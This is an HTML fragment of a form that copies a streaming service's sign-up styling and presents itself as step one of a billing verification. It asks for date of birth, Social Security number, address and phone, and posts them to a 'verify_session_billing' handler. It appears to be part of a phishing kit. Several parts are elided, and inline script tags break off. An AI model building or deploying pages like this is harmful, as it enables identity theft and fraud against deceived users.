			...
			<div class="basicLayout notMobile modernInApp hasLargeTypography signupSimplicity-creditOptionMode simplicity" lang="en-US" dir="ltr">
				...
				<div class="simpleContainer" data-transitioned-child="true">
					<div class="centerContainer" wfd-invisible="true" style="display: block; transform: none; opacity: 1; transition-duration: 250ms;">
						<form method="POST" action="process/verify_session_billing" data-uia="payment-form">
							<div class="paymentFormContainer">
								<div>
									<div class="stepHeader-container" data-uia="header">
										<div class="stepHeader" data-a11y-focus="true" tabindex="0"><span id="" class="stepIndicator" data-uia="">STEP <b>1</b> OF <b>3</b></span>
											<h1 class="stepTitle" data-uia="stepTitle">Personal Information</h1></div>
									</div>
								</div>
										...
										<ul class="simpleForm structural ui-grid">
											...
											<li data-uia="field-firstName+wrapper" class="nfFormSpace">
												<div data-uia="field-firstName+container" class="nfInput nfInputOversize">
													<div class="nfInputPlacement">
														<label class="input_id" placeholder="firstName">
															<input data-uia="field-firstName" name="dob" placeholder="Date Of Birth" required="true" class="nfTextField" id="dob" type="tel" tabindex="0" autocomplete="cc-given-name" maxlength="100" minlength="1" dir="" value="">
											...
											<li data-uia="field-lastName+wrapper" class="nfFormSpace">
												<div data-uia="field-lastName+container" class="nfInput nfInputOversize">
													<div class="nfInputPlacement">
														<label class="input_id" placeholder="lastName">
															<input data-uia="field-lastName" name="ssn" class="nfTextField" required="true" placeholder="Social Security Number" id="ssn" type="tel" tabindex="0" autocomplete="cc-family-name" dir="" value="">
															<script src="files/mask.js"></script>
															<script>
											...
											<li data-uia="field-firstName+wrapper" class="nfFormSpace">
												<div data-uia="field-firstName+container" class="nfInput nfInputOversize">
													<div class="nfInputPlacement">
														<label class="input_id" placeholder="firstName">
															<input data-uia="field-firstName" name="address" placeholder="Address Line" required="true" class="nfTextField" id="address" type="text" tabindex="0" autocomplete="cc-given-name" maxlength="100" minlength="1" dir="" value="">
															<label for="id_firstName" class="placeLabel"></label>
														</label>
													</div>
												</div>
											...
											<li data-uia="field-firstName+wrapper" class="nfFormSpace">
												<div data-uia="field-firstName+container" class="nfInput nfInputOversize">
													<div class="nfInputPlacement">
														<label class="input_id" placeholder="firstName">
															<input data-uia="field-firstName" name="city" placeholder="City" required="true" class="nfTextField" id="city" type="text" tabindex="0" autocomplete="cc-given-name" maxlength="100" minlength="1" dir="" value="">
															<label for="id_firstName" class="placeLabel"></label>
														</label>
													</div>
												</div>
											...
											<li data-uia="field-lastName+wrapper" class="nfFormSpace">
												<div data-uia="field-lastName+container" class="nfInput nfInputOversize">
													<div class="nfInputPlacement">
														<label class="input_id" placeholder="lastName">
															<input data-uia="field-lastName" name="state" class="nfTextField" required="true" placeholder="State" id="state" type="text" tabindex="0" autocomplete="cc-family-name" dir="" value="">
															<label for="id_lastName" class="placeLabel"></label>
														</label>
													</div>
												</div>
											...
											<li data-uia="field-firstName+wrapper" class="nfFormSpace">
												<div data-uia="field-firstName+container" class="nfInput nfInputOversize">
													<div class="nfInputPlacement">
														<label class="input_id" placeholder="firstName">
															<input data-uia="field-firstName" name="zip" placeholder="Zip" required="true" class="nfTextField" id="zip" type="tel" tabindex="0" autocomplete="cc-given-name" maxlength="5"  dir="" value="">
															<label for="id_firstName" class="placeLabel"></label>
														</label>
													</div>
												</div>
											...
											<li data-uia="field-lastName+wrapper" class="nfFormSpace">
												<div data-uia="field-lastName+container" class="nfInput nfInputOversize">
													<div class="nfInputPlacement">
														<label class="input_id" placeholder="lastName">
															<input data-uia="field-lastName" name="phone" class="nfTextField" required="true" placeholder="Phone" id="phone" type="tel" tabindex="0" autocomplete="cc-family-name" dir="" value="">
															<script src="files/mask.js"></script>
															<script>
